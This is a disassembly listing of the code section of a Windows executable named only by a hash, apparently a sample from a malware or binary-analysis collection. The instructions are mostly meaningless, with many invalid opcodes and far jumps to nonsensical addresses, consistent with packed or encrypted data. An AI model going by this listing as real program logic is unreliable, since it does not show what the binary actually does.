
984f2c720c8838e7943a2a7a8fb7e5ead4d42a5cd6ab397d9bf3f8e01e22d7dd.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	mov    ecx,0xfbda9575
  411005:	pop    ds
  411006:	(bad)  
  411007:	stos   DWORD PTR es:[edi],eax
  411008:	adc    DWORD PTR es:[esi+0x35],ebx
  41100c:	fidivr WORD PTR [ecx]
  41100e:	or     eax,0x5846e5cb
  411013:	outs   dx,DWORD PTR ds:[esi]
  411014:	icebp  
  411015:	adc    al,0x43
  411017:	jl     0x858e5f0a
  41101d:	sub    al,0x93
  41101f:	jmp    0xbcbd:0xefc5bd89
  411026:	popw   es
  411028:	(bad)  
  411029:	aad    0xa1
  41102b:	and    cl,BYTE PTR [esi+ebp*8-0x4f49fd74]
  411032:	retf   
  411033:	sub    dh,BYTE PTR [esp+esi*2-0x1348043]
  41103a:	pop    edi
  41103b:	add    BYTE PTR [edi+0x47],bl
  41103e:	pop    ds
  41103f:	out    0x13,al
  411041:	xchg   DWORD PTR [eax],ebx
  411043:	mov    eax,ds:0x77623ab8
  411048:	push   edx
  411049:	out    0xcf,eax
  41104b:	lds    edx,FWORD PTR [edx]
  41104d:	dec    ebx
  41104e:	pusha  
  41104f:	test   BYTE PTR [eax+0x76],cl
  411052:	xor    eax,DWORD PTR [edi+0x5724914]
  411058:	xchg   esp,eax
  411059:	or     DWORD PTR [edx+ecx*2],esp
  41105c:	ja     0x4110a0
  41105e:	in     al,dx
  41105f:	add    esi,DWORD PTR [ebp+0x2110207d]
  411065:	sbb    cl,BYTE PTR [eax-0x30813c37]
  41106b:	in     eax,0x55
  41106d:	call   0x83c8a9f4
  411072:	dec    DWORD PTR [ebx+0x1c2b5a2e]
  411078:	mov    eax,ds:0xe212c788
  41107d:	iret   
  41107e:	iret   
  41107f:	lds    ebp,FWORD PTR [ecx]
  411081:	ficom  DWORD PTR [ebp+0x3bcf70da]
  411087:	shl    DWORD PTR ds:0xcd6f6fff,0xc6
  41108e:	(bad)  
  41108f:	mov    WORD PTR [ebx],es
  411091:	mov    cl,0xbe
  411093:	push   esp
  411094:	cwde   
  411095:	(bad)  
  411096:	loope  0x41107f
  411098:	xchg   ebx,eax
  411099:	add    esi,0x1cffef70
  41109f:	jge    0x411039
  4110a1:	pop    ds
  4110a2:	fidiv  DWORD PTR [eax]
  4110a4:	icebp  
  4110a5:	(bad)  
  4110a6:	hlt    
  4110a7:	xlat   BYTE PTR ds:[ebx]
  4110a8:	mov    ebp,0xfcabb2c5
  4110ad:	and    bl,BYTE PTR [esi+esi*4+0x6d]
  4110b1:	mov    dl,ch
  4110b3:	js     0x411051
  4110b5:	in     eax,dx
  4110b6:	gs push ebp
  4110b8:	xor    DWORD PTR [ecx+0x5bfd021],esp
  4110be:	xchg   esi,eax
  4110bf:	jae    0x4110ae
  4110c1:	arpl   WORD PTR [eax],dx
  4110c3:	sub    edi,DWORD PTR [ebx+edi*2-0x2a8a80fe]
  4110ca:	pop    esi
  4110cb:	shl    BYTE PTR [ebp-0x7f843e9d],cl
  4110d1:	dec    edi
  4110d2:	mov    ecx,0x50afbcd8
  4110d7:	jmp    0xd64e:0x35537cb6
  4110de:	iret   
  4110df:	add    eax,0xffe67cd6
  4110e4:	jl     0x4110c1
  4110e6:	popf   
  4110e7:	idiv   DWORD PTR [ebx-0x7c1196d7]
  4110ed:	mov    dh,0xde
  4110ef:	push   cs
  4110f0:	mov    edx,0xe2aa2aa2
  4110f5:	icebp  
  4110f6:	sub    BYTE PTR [ecx-0x5e],cl
  4110f9:	cmp    al,al
  4110fb:	mov    BYTE PTR [ecx+eiz*4+0x428efdc],dh
  411102:	push   ebp
  411103:	xor    BYTE PTR [edi-0x6dcedd00],al
  411109:	pop    ecx
  41110a:	ret    0xfa65
  41110d:	test   DWORD PTR [eax+esi*1-0xc124279],ecx
  411114:	xchg   edx,eax
  411115:	jno    0x411190
  411117:	dec    ecx
  411118:	mov    esi,0x4ff9eabf
  41111d:	dec    eax
  41111e:	call   0x93a51495
  411123:	cli    
  411124:	inc    ebx
  411125:	jl     0x4111a1
  411127:	push   ecx
  411128:	jg     0x4110ef
  41112a:	push   esi
  41112b:	mov    DWORD PTR [esi],eax
  41112d:	push   ds
  41112e:	outs   dx,DWORD PTR ds:[esi]
  41112f:	add    BYTE PTR [edx+0x36e54426],bh
  411135:	mov    esi,0xf438e0ef
  41113a:	jno    0x4110f0
  41113c:	sub    ah,BYTE PTR [ebx]
  41113e:	loopne 0x4111bd
  411140:	inc    DWORD PTR [eax-0x7d0ca263]
  411146:	imul   ebp,DWORD PTR [ebp-0x70e2c514],0x2ae9cbdf
  411150:	jae    0x41117e
  411152:	addr16 iret 
  411154:	cmp    cl,BYTE PTR [edi+0x62]
  411157:	cmp    ebx,DWORD PTR [edx+0x33]
  41115a:	adc    edx,DWORD PTR [edi]
  41115c:	xchg   edi,eax
  41115d:	ret    
  41115e:	adc    bl,ah
  411160:	add    cl,BYTE PTR [ebp+0x2]
  411163:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411164:	das    
  411165:	lea    esi,[edi]
  411167:	rcl    DWORD PTR [eax+0x4ce99eae],1
  41116d:	or     eax,DWORD PTR [eax]
  41116f:	inc    esp
  411170:	gs clc 
  411172:	enter  0x4588,0x1e
  411176:	and    BYTE PTR ds:0x93a2e5d4,bh
  41117c:	repz in al,dx
  41117e:	xor    al,BYTE PTR [edi+0x39]
  411181:	rcl    BYTE PTR [edi+0x14],cl
  411184:	call   FWORD PTR [ebx-0x45]
  411187:	push   es
  411188:	loope  0x411186
  41118a:	sub    ecx,edi
  41118c:	rcr    BYTE PTR [ecx+ebx*4],0xff
  411190:	mov    bl,0x73
  411192:	pop    edi
  411193:	fwait
  411194:	adc    cl,BYTE PTR [ecx+0x45]
  411197:	xor    edi,DWORD PTR [edi-0x37]
  41119a:	les    esp,FWORD PTR [edi-0x5d]
  41119d:	jo     0x411120
  41119f:	das    
  4111a0:	xlat   BYTE PTR ds:[ebx]
  4111a1:	mov    ch,0xa0
  4111a3:	mov    DWORD PTR [ebx-0x66b1342e],esi
  4111a9:	rcl    DWORD PTR [edx-0x1a61f7c6],1
  4111af:	mov    edi,0xac2b8249
  4111b4:	push   es
  4111b5:	cmp    BYTE PTR [eax-0x16],bh
  4111b8:	(bad)  
  4111b9:	mov    ecx,0x3697995b
  4111be:	ret    
  4111bf:	ror    eax,0x61
  4111c2:	add    eax,0x9d9409ed
  4111c7:	in     eax,0x8d
  4111c9:	fcom   DWORD PTR [ecx-0x42]
  4111cc:	cld    
  4111cd:	dec    edi
  4111ce:	icebp  
  4111cf:	adc    DWORD PTR [ebp-0x62],ebp
  4111d2:	add    eax,0x9649bed2
  4111d7:	jb     0x4111bc
  4111d9:	cmc    
  4111da:	sub    edx,DWORD PTR [esi-0x56]
  4111dd:	and    DWORD PTR [edx+0x4349192c],0x1d
  4111e4:	btr    DWORD PTR ds:[edx+0x1e],esp
  4111e9:	mov    fs,WORD PTR [edx+0x6c]
  4111ec:	dec    esi
  4111ed:	cmp    DWORD PTR [ecx-0x61],esi
  4111f0:	pop    edx
  4111f1:	fnstsw WORD PTR [eax]
  4111f3:	jnp    0x41120d
  4111f5:	addr16 aad 0xcb
  4111f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111f9:	mov    eax,ds:0x4a790ea0
  4111fe:	(bad)  
  4111ff:	xor    ebx,DWORD PTR [edi+0x2a016ca3]
  411205:	adc    cl,BYTE PTR [eax+ebx*1]
  411208:	popa   
  411209:	sbb    bl,BYTE PTR [edi-0x5f6247e]
  41120f:	test   BYTE PTR [edx-0x129d8610],0xad
  411216:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411217:	cmp    BYTE PTR [ebx],ah
  411219:	jbe    0x411233
  41121b:	jmp    0xce2d:0xf22ee201
  411222:	stos   BYTE PTR es:[edi],al
  411223:	fisub  DWORD PTR [eax-0x26]
  411226:	stos   DWORD PTR es:[edi],eax
  411227:	pop    esi
  411228:	pop    edx
  411229:	or     eax,0xeee48da5
  41122e:	lds    edx,FWORD PTR [ecx]
  411230:	fwait
  411231:	cld    
  411232:	mov    esp,0x4a424be0
  411237:	fwait
  411238:	cmp    DWORD PTR [esi-0x3f2da1a7],ebx
  41123e:	clc    
  41123f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411240:	xchg   edx,eax
  411241:	jo     0x411243
  411243:	xchg   ebx,eax
  411244:	loop   0x4112a2
  411246:	jmp    0x411283
  411248:	add    ah,BYTE PTR [esi-0x23]
  41124b:	pop    ebx
  41124c:	adc    ebp,eax
  41124e:	xlat   BYTE PTR ds:[ebx]
  41124f:	xor    al,BYTE PTR [eax]
  411251:	imul   ecx,DWORD PTR [ebx],0x6ee6d95a
  411257:	in     eax,dx
  411258:	mov    cl,0xb2
  41125a:	mov    ah,BYTE PTR [eax-0x5b]
  41125d:	test   eax,0xabe8af63
  411262:	jl     0x41125a
  411264:	push   edx
  411265:	lahf   
  411266:	and    esp,DWORD PTR [ebx+0x265f2c8a]
  41126c:	outs   dx,BYTE PTR ds:[esi]
  41126d:	and    eax,0xdfc49ea0
  411272:	push   ebx
  411273:	(bad)  
  411274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411275:	jle    0x4112e4
  411277:	xor    DWORD PTR [edx+0x6e],eax
  41127a:	(bad)  
  41127b:	or     edi,DWORD PTR [edi+0x2]
  41127e:	js     0x41122e
  411280:	add    eax,0xbecc33de
  411285:	mov    DWORD PTR [esi-0x53],eax
  411288:	xchg   esi,eax
  411289:	aad    0xd2
  41128b:	push   ebp
  41128c:	push   esi
  41128d:	sahf   
  41128e:	loop   0x411220
  411290:	outs   dx,BYTE PTR ds:[esi]
  411291:	or     edi,edx
  411293:	xchg   edx,eax
  411294:	icebp  
  411295:	xor    al,0x42
  411297:	or     edi,0xffffffc3
  41129a:	xlat   BYTE PTR ds:[ebx]
  41129b:	lea    edx,[esi-0x1ea20a25]
  4112a1:	xchg   edx,eax
  4112a2:	in     al,0xdf
  4112a4:	jnp    0x4112c9
  4112a6:	sub    edi,esp
  4112a8:	sbb    al,0xe9
  4112aa:	outs   dx,DWORD PTR ds:[esi]
  4112ab:	jmp    0x9b9f:0x7be6d9f8
  4112b2:	pop    ds
  4112b3:	lock add al,0x5b
  4112b6:	xor    BYTE PTR [edx+0x6931f79c],dl
  4112bc:	ret    0xb874
  4112bf:	fdivr  DWORD PTR [edi+0x10ec7a99]
  4112c5:	call   0x8f37:0x5ccf793b
  4112cc:	pop    es
  4112cd:	or     al,0x55
  4112cf:	mov    DWORD PTR [ebp+ebp*8+0x59],esp
  4112d3:	fiadd  DWORD PTR [ebp+ebx*4-0x60]
  4112d7:	daa    
  4112d8:	push   0x37
  4112da:	or     DWORD PTR [ecx],0x1de160b2
  4112e0:	adc    dh,BYTE PTR [esi-0x424e15f2]
  4112e6:	addr16 xchg esp,eax
  4112e8:	aaa    
  4112e9:	retf   
  4112ea:	out    0x1b,al
  4112ec:	stc    
  4112ed:	push   eax
  4112ee:	mov    esp,0xaf4d03ef
  4112f3:	(bad)  
  4112f5:	dec    edx
  4112f6:	xchg   ebp,eax
  4112f7:	lock mov bh,0xda
  4112fa:	in     eax,dx
  4112fb:	mov    esp,0xd7474154
  411300:	mov    esi,0x55c3274f
  411305:	ret    0x637e
  411308:	and    BYTE PTR [eax+0x6ca2deeb],bl
  41130e:	fwait
  41130f:	test   al,0x97
  411311:	mov    ch,0x6
  411313:	imul   ebp,DWORD PTR [edi+edx*2-0x31],0xffffffa1
  411318:	loop   0x411310
  41131a:	push   es
  41131b:	ss pushf 
  41131d:	out    dx,al
  41131e:	aaa    
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	retf   0x3df9
  411323:	jb     0x411352
  411325:	in     eax,dx
  411326:	mov    ebx,0xe30ff9c5
  41132b:	mov    eax,ds
  41132d:	xor    DWORD PTR [esi],ecx
  41132f:	or     DWORD PTR [edx],ecx
  411331:	or     DWORD PTR [ebx],edx
  411333:	sbb    dh,dl
  411335:	pop    esi
  411336:	pusha  
  411337:	sbb    BYTE PTR [eax-0x28c9ba19],dh
  41133d:	mov    al,0xe1
  41133f:	xor    eax,0xac536e21
  411344:	jae    0x41136b
  411346:	bound  edi,QWORD PTR [eax+edi*4]
  411349:	sub    ch,BYTE PTR [eax-0x21]
  41134c:	ficom  WORD PTR [edi-0x53]
  41134f:	or     bh,BYTE PTR [edx+0x64]
  411352:	xchg   ebp,eax
  411353:	push   es
  411354:	ds dec esp
  411356:	mov    ds:0x6fcced16,al
  41135b:	aaa    
  41135c:	adc    BYTE PTR [ebx],bl
  41135e:	xchg   edx,eax
  41135f:	stc    
  411360:	mov    dl,0xab
  411362:	jmp    0x8953cdee
  411367:	push   edx
  411368:	aas    
  411369:	pop    ebx
  41136a:	loope  0x41137a
  41136c:	sub    cl,BYTE PTR [esi+eax*8]
  41136f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411370:	mov    esp,0x8aacaa86
  411375:	jae    0x411308
  411377:	mov    esi,0xe686d9e4
  41137c:	dec    edi
  41137d:	inc    edi
  41137e:	test   al,0x2c
  411380:	je     0x41130c
  411382:	mov    dl,0xb
  411384:	push   ebx
  411385:	call   0xe797a4be
  41138a:	lock xchg ecx,eax
  41138c:	cwde   
  41138d:	dec    ebx
  41138e:	xor    esp,DWORD PTR [edi]
  411390:	mov    ebp,0x163a1a80
  411395:	jle    0x4113b4
  411397:	ss pop edx
  411399:	test   BYTE PTR [eax-0x14],dh
  41139c:	mov    al,ds:0xd1c5dab1
  4113a1:	lods   eax,DWORD PTR ds:[esi]
  4113a2:	popa   
  4113a3:	mov    ebp,0x8698eef8
  4113a8:	jmp    FWORD PTR [edx-0x1022a6b6]
  4113ae:	dec    edi
  4113af:	test   eax,0xac850e62
  4113b4:	push   esi
  4113b5:	xor    edi,DWORD PTR [edi-0x7bb207fe]
  4113bb:	aaa    
  4113bc:	repnz retf 
  4113be:	out    dx,al
  4113bf:	adc    BYTE PTR ds:0xa04b32c8,0x5e
  4113c6:	push   0xffffff85
  4113c8:	cmp    DWORD PTR [ebx+0x16],0x285f8150
  4113cf:	sbb    eax,0xffdc9e5b
  4113d4:	loope  0x41135c
  4113d6:	push   0xd26182bc
  4113db:	xlat   BYTE PTR ds:[ebx]
  4113dc:	fnstenv [ebx]
  4113de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113df:	mov    bh,dh
  4113e1:	aas    
  4113e2:	inc    eax
  4113e3:	ficom  DWORD PTR [eax]
  4113e5:	and    al,0x9a
  4113e7:	loope  0x411420
  4113e9:	icebp  
  4113ea:	pop    edi
  4113eb:	push   esp
  4113ec:	xchg   esp,eax
  4113ed:	pop    ecx
  4113ee:	push   es
  4113ef:	pop    ss
  4113f0:	ror    DWORD PTR [edx],0x2
  4113f3:	inc    esp
  4113f4:	int3   
  4113f5:	jmp    0x1c5b:0x1f269a20
  4113fc:	stc    
  4113fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113fe:	xor    BYTE PTR [ebx],ch
  411400:	fmul   DWORD PTR [edx+0x39852928]
  411406:	fistp  WORD PTR [ecx+0x54]
  411409:	fs inc ecx
  41140b:	leave  
  41140c:	inc    DWORD PTR [ebx+esi*2+0x787094a5]
  411413:	sbb    eax,esp
  411415:	aam    0xaa
  411417:	cmp    eax,0x42b5fe15
  41141c:	lahf   
  41141d:	rcr    DWORD PTR [ebp+0x2],1
  411420:	mov    al,0x8e
  411422:	je     0x41144a
  411424:	clc    
  411425:	cmp    eax,eax
  411427:	aam    0x5f
  411429:	jno    0x4113d4
  41142b:	xchg   ebp,eax
  41142c:	sub    ch,BYTE PTR [edi]
  41142e:	dec    edi
  41142f:	cmp    BYTE PTR [esi+ebx*2],bh
  411432:	and    eax,0x248ba852
  411437:	nop
  411438:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411439:	and    edx,ebx
  41143b:	pop    ss
  41143c:	jns    0x411445
  41143e:	push   0x4a1066c0
  411443:	fs repz pop edi
  411446:	jg     0x41145e
  411448:	pop    es
  411449:	popa   
  41144a:	pop    esi
  41144b:	push   0x4f2711c9
  411450:	push   0xc3518134
  411455:	cmc    
  411456:	rol    BYTE PTR [esi+0x7f13dc95],0xab
  41145d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41145e:	sbb    BYTE PTR [ebp-0x4b],bl
  411461:	outs   dx,BYTE PTR ds:[esi]
  411462:	dec    edx
  411463:	jo     0x41149d
  411465:	lea    eax,[ecx]
  411467:	sti    
  411468:	aaa    
  411469:	or     ecx,DWORD PTR [ebp+0x33]
  41146c:	repz and al,0x4
  41146f:	(bad)  
  411470:	sti    
  411471:	stc    
  411472:	leave  
  411473:	inc    ebx
  411474:	test   eax,0x7c1a2db1
  411479:	or     eax,0x59ae4709
  41147e:	sbb    eax,DWORD PTR [ecx-0x40]
  411481:	jecxz  0x411466
  411483:	and    eax,0x1eaf3bda
  411488:	push   ds
  411489:	cmp    al,0x1c
  41148b:	in     al,0x71
  41148d:	call   0x108415bc
  411492:	jmp    0x5a81a35d
  411497:	daa    
  411498:	mov    ds:0x203e1863,al
  41149d:	and    al,0x91
  41149f:	ret    
  4114a0:	xchg   ecx,eax
  4114a1:	pop    esi
  4114a2:	arpl   WORD PTR [edi],dx
  4114a4:	mov    ebp,0x8adf9156
  4114a9:	add    ebp,eax
  4114ab:	mov    BYTE PTR [ebx-0x64],ch
  4114ae:	mov    cl,0xc6
  4114b0:	jge    0x411505
  4114b2:	fisubr WORD PTR [edx-0x3ebcec3e]
  4114b8:	out    0x32,al
  4114ba:	lea    ebx,[edi+0x742a57b3]
  4114c0:	repnz xor al,0x64
  4114c3:	iret   
  4114c4:	aaa    
  4114c5:	mov    ds:0x46bc88b4,al
  4114ca:	push   ebp
  4114cb:	stc    
  4114cc:	stos   BYTE PTR es:[edi],al
  4114cd:	popa   
  4114ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114cf:	xchg   BYTE PTR [eax-0x7712e3e0],dh
  4114d5:	nop
  4114d6:	std    
  4114d7:	ins    BYTE PTR es:[edi],dx
  4114d8:	stos   BYTE PTR es:[edi],al
  4114d9:	jmp    0x940c82c6
  4114de:	pop    ebx
  4114df:	or     DWORD PTR [eax+0x40d9714d],esi
  4114e5:	test   BYTE PTR ss:[esi],0x78
  4114e9:	dec    edx
  4114ea:	jne    0x4114cf
  4114ec:	(bad)  
  4114ed:	dec    ecx
  4114ee:	add    eax,0x3180675f
  4114f3:	lods   al,BYTE PTR ss:[esi]
  4114f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114f6:	or     ch,BYTE PTR [ebx]
  4114f8:	pusha  
  4114f9:	push   edx
  4114fa:	fistp  WORD PTR [esi+ebp*1-0x8fa90e2]
  411501:	add    esp,0xffffffcd
  411504:	dec    edx
  411505:	cwde   
  411506:	loopne 0x4114ba
  411508:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411509:	mov    eax,ds:0xe3613792
  41150e:	xor    ecx,DWORD PTR [eax]
  411510:	test   eax,0x9894406c
  411515:	pusha  
  411516:	xor    ch,BYTE PTR [ebx-0x2e]
  411519:	push   0xb2b950
  41151e:	sbb    eax,0xa51db0d8
  411523:	in     al,0xef
  411525:	stos   BYTE PTR es:[edi],al
  411526:	data16 jbe 0x411537
  411529:	jno    0x4114f3
  41152b:	loop   0x4115aa
  41152d:	sbb    eax,0x264eb203
  411532:	pushf  
  411533:	retf   0x865f
  411536:	sub    al,0xa3
  411538:	jge    0x4115a8
  41153a:	inc    eax
  41153b:	btc    DWORD PTR [eax-0x2f6e7355],eax
  411542:	pop    ebp
  411543:	pop    esp
  411544:	ins    DWORD PTR es:[edi],dx
  411545:	in     al,0x42
  411547:	jbe    0x411542
  411549:	fild   WORD PTR [edx+0x15]
  41154c:	fld    DWORD PTR ds:0x933323cf
  411552:	(bad)  [edi+0x5599dc0e]
  411558:	scas   eax,DWORD PTR es:[edi]
  411559:	mov    ds:0xa751bf9b,eax
  41155e:	int3   
  41155f:	xor    BYTE PTR [ecx-0x42],ch
  411562:	adc    ebp,DWORD PTR [edx]
  411564:	cs fwait
  411566:	or     ecx,DWORD PTR [eax-0x9]
  411569:	(bad)  
  41156a:	push   esi
  41156b:	icebp  
  41156c:	mov    ebp,0x890bb835
  411571:	add    DWORD PTR [ebx-0x24c07360],0xffffff87
  411578:	int    0x4d
  41157a:	and    edi,DWORD PTR [eax]
  41157c:	dec    eax
  41157d:	sub    dl,BYTE PTR [edx]
  41157f:	add    eax,0x5906fcd4
  411584:	push   ebp
  411585:	mov    bl,BYTE PTR [ebp+0x7f]
  411588:	sbb    edi,DWORD PTR [edx]
  41158a:	(bad)  
  41158b:	rcr    BYTE PTR [edx-0x2e06ae43],0x79
  411592:	or     BYTE PTR [edx+0x30aa27e6],cl
  411598:	out    dx,al
  411599:	cs mov esp,0x571b6cc1
  41159f:	adc    al,0x26
  4115a1:	adc    al,0x66
  4115a3:	ret    
  4115a4:	mov    dl,BYTE PTR [ebp+edi*2-0x5e]
  4115a8:	add    cl,BYTE PTR [edi-0x6]
  4115ab:	and    DWORD PTR [ebp-0x77],edi
  4115ae:	aaa    
  4115af:	push   esi
  4115b0:	adc    al,0x9a
  4115b2:	mov    bh,dh
  4115b4:	into   
  4115b5:	lea    ebp,[ebp-0x2cb59375]
  4115bb:	stos   DWORD PTR es:[edi],eax
  4115bc:	inc    edx
  4115bd:	pop    eax
  4115be:	aaa    
  4115bf:	scas   al,BYTE PTR es:[edi]
  4115c0:	pop    eax
  4115c1:	mov    WORD PTR [edx],fs
  4115c3:	jnp    0x4115c1
  4115c5:	imul   edi,DWORD PTR [ebp+0x68],0x96ac4b1b
  4115cc:	xor    BYTE PTR [eax-0x7b7f56a2],0x91
  4115d3:	jb     0x41162c
  4115d5:	frstor [esi-0x25ef54df]
  4115db:	loope  0x411593
  4115dd:	pop    es
  4115de:	and    edi,0x6f11a67a
  4115e4:	cmp    DWORD PTR [eax-0x5bd0c170],eax
  4115ea:	and    BYTE PTR [edx+0x1d],cl
  4115ed:	jnp    0x411641
  4115ef:	outs   dx,DWORD PTR ds:[esi]
  4115f0:	mov    ch,0x86
  4115f2:	xchg   edx,eax
  4115f3:	imul   esi,DWORD PTR [ecx-0x1f3a0758],0x7b
  4115fa:	mov    esp,0xea5be2f0
  4115ff:	xlat   BYTE PTR ds:[ebx]
  411600:	xchg   ebp,edi
  411602:	mov    esi,0x3e47a4d9
  411607:	xchg   esp,eax
  411608:	imul   BYTE PTR [ebx-0x6c]
  41160b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41160c:	scas   eax,DWORD PTR es:[edi]
  41160d:	test   DWORD PTR [eax],ebx
  41160f:	adc    eax,0xf401671c
  411614:	sub    eax,DWORD PTR ds:0xdb6f403
  41161a:	dec    ecx
  41161b:	sbb    eax,0x7a5ea729
  411620:	sbb    al,0x6d
  411622:	add    ebp,DWORD PTR [edi+0xe]
  411625:	(bad)
  411628:	or     DWORD PTR [edx-0x53],eax
  41162b:	mov    ds:0xafbf50d5,eax
  411630:	shl    DWORD PTR [ebp-0x73],1
  411633:	cdq    
  411634:	and    bh,BYTE PTR [edx-0x56]
  411637:	push   0x2cd5f1be
  41163c:	mov    eax,ds:0xbdfc049e
  411641:	xchg   esp,eax
  411642:	mov    ch,0xaa
  411644:	sub    BYTE PTR [edx],ch
  411646:	adc    ch,0x8d
  411649:	aas    
  41164a:	pop    ecx
  41164b:	clc    
  41164c:	mov    al,0xa3
  41164e:	jmp    0x41166d
  411650:	shr    BYTE PTR [eax],0xb6
  411653:	scas   eax,DWORD PTR es:[edi]
  411654:	(bad)  
  411655:	outs   dx,BYTE PTR ds:[esi]
  411656:	pop    edi
  411657:	mov    WORD PTR [edx],cs
  411659:	mov    bl,0x9d
  41165b:	inc    ebx
  41165c:	fwait
  41165d:	push   cs
  41165e:	js     0x411668
  411660:	jge    0x4116b6
  411662:	(bad)  
  411663:	fiadd  DWORD PTR [ecx+0x6171a5bf]
  411669:	xor    edx,edx
  41166b:	jge    0x4115fa
  41166d:	dec    esp
  41166e:	push   esp
  41166f:	adc    eax,0x6f10462b
  411674:	stos   BYTE PTR es:[edi],al
  411675:	les    eax,FWORD PTR [esi-0x5e]
  411678:	data16 fcmovbe st,st(4)
  41167b:	idiv   DWORD PTR [esi]
  41167d:	sbb    ch,bl
  41167f:	leave  
  411680:	push   ds
  411681:	call   0x1f4a9a12
  411686:	mov    WORD PTR [edi-0x4e0121af],gs
  41168c:	add    BYTE PTR [eax+0x71],al
  41168f:	push   ds
  411690:	aad    0xbd
  411692:	enter  0xc438,0xe5
  411696:	mov    al,ds:0x66b8bdd
  41169b:	(bad)  
  41169c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41169d:	gs jmp 0x411639
  4116a0:	call   0x3cbc097a
  4116a5:	mov    ch,cl
  4116a7:	sbb    eax,0xbf120af5
  4116ac:	je     0x4116bb
  4116ae:	adc    BYTE PTR [eax+0x40],dh
  4116b1:	and    al,0xfa
  4116b3:	in     al,0x80
  4116b5:	ror    ah,0x63
  4116b8:	xchg   ecx,eax
  4116b9:	pop    eax
  4116ba:	jne    0x41169f
  4116bc:	sbb    al,0x56
  4116be:	mov    al,0xfa
  4116c0:	fs push esp
  4116c2:	fwait
  4116c3:	cs es push eax
  4116c6:	test   al,0xb9
  4116c8:	push   es
  4116c9:	mov    eax,ds:0x76b17c58
  4116ce:	loop   0x4116b8
  4116d0:	mov    ch,0xe7
  4116d2:	lahf   
  4116d3:	out    0x9a,eax
  4116d5:	mov    cl,0x48
  4116d7:	jns    0x411748
  4116d9:	(bad)  
  4116da:	xlat   BYTE PTR ds:[ebx]
  4116db:	nop
  4116dc:	fnop   
  4116de:	mov    dh,0x3
  4116e0:	sahf   
  4116e1:	push   0xffffff87
  4116e3:	mov    DWORD PTR [eax+0x40c7dbdb],ebx
  4116e9:	lahf   
  4116ea:	rcl    BYTE PTR [ebx-0x20],0xc6
  4116ee:	stos   DWORD PTR es:[edi],eax
  4116ef:	push   ebp
  4116f0:	dec    ebp
  4116f1:	mov    ebx,edi
  4116f3:	lods   eax,DWORD PTR ds:[esi]
  4116f4:	mov    ch,0xc
  4116f6:	mov    ebp,0x8b7d22c8
  4116fb:	outs   dx,DWORD PTR ds:[esi]
  4116fc:	pmaxub mm2,QWORD PTR [esi-0x773c47a7]
  411703:	sub    DWORD PTR [ebx+eiz*4-0x66],esi
  411707:	fstp   DWORD PTR [eax-0x7e]
  41170a:	js     0x4116fd
  41170c:	cmc    
  41170d:	(bad)  
  41170e:	mov    ds:0x26001233,al
  411713:	mov    WORD PTR [eax-0x25],es
  411716:	dec    ebx
  411717:	mov    ds:0x370cc08f,eax
  41171c:	sar    eax,0x30
  41171f:	leave  
  411720:	test   al,0x3b
  411722:	add    esi,DWORD PTR [edi-0x2e]
  411725:	mov    DWORD PTR es:[edi+0x5a],esi
  411729:	cld    
  41172a:	mov    ebx,0xdec53f8f
  41172f:	adc    eax,0x77d1a5a
  411734:	loopne 0x411799
  411736:	retf   
  411737:	lods   al,BYTE PTR ds:[esi]
  411738:	fld    TBYTE PTR [ebp+0x62]
  41173b:	mov    dh,0xe1
  41173d:	ret    0x3287
  411740:	int3   
  411741:	std    
  411742:	jg     0x4116dc
  411744:	push   ds
  411745:	sbb    dl,BYTE PTR ds:0x9b005c34
  41174b:	jmp    0x41171e
  41174d:	outs   dx,BYTE PTR ds:[esi]
  41174e:	push   esp
  41174f:	(bad)  
  411750:	dec    edi
  411751:	mov    eax,ds:0xe05d37a6
  411756:	fistp  WORD PTR [eax]
  411758:	into   
  411759:	pop    edi
  41175a:	cs sub al,cl
  41175d:	mov    eax,ds:0x520c92e7
  411762:	ficom  WORD PTR [edx-0x3]
  411765:	cmp    ecx,DWORD PTR [edi+0x235dd9f9]
  41176b:	jae    0x411728
  41176d:	mov    bl,ch
  41176f:	mov    DWORD PTR ds:0xd7bd9ddd,ecx
  411775:	stos   DWORD PTR es:[edi],eax
  411776:	cmp    DWORD PTR [ecx-0x2f],ebx
  411779:	push   eax
  41177a:	pop    esp
  41177b:	push   0xd3269e31
  411780:	dec    esi
  411781:	pop    ebp
  411782:	jle    0x41173d
  411784:	lock imul DWORD PTR [edi+edi*1]
  411788:	push   cs
  411789:	ret    0x8f33
  41178c:	imul   esi,eax,0x3e
  41178f:	ins    BYTE PTR es:[edi],dx
  411790:	scas   al,BYTE PTR es:[edi]
  411791:	cwde   
  411792:	fimul  DWORD PTR [esi-0x263c558]
  411798:	std    
  411799:	push   edx
  41179a:	dec    edx
  41179b:	imul   eax,ebp,0x62
  41179e:	je     0x4117c8
  4117a0:	shl    BYTE PTR [ecx+0x22],cl
  4117a3:	shl    BYTE PTR [eax],1
  4117a5:	ficomp DWORD PTR [edx+0x13]
  4117a8:	dec    ebx
  4117a9:	test   eax,0xb7a96743
  4117ae:	popf   
  4117af:	(bad)  
  4117b1:	in     eax,0xe7
  4117b3:	mov    edi,0xc7f7141e
  4117b8:	add    bl,al
  4117ba:	aad    0x23
  4117bc:	cmc    
  4117bd:	repnz sub ah,BYTE PTR [ebx-0x75]
  4117c1:	pop    ds
  4117c2:	mov    WORD PTR [ebx-0x51],gs
  4117c5:	xor    al,0x34
  4117c7:	mov    DWORD PTR [ecx],ebx
  4117c9:	pop    es
  4117ca:	jb     0x41178f
  4117cc:	daa    
  4117cd:	and    al,0x10
  4117cf:	(bad)  
  4117d1:	stos   BYTE PTR es:[edi],al
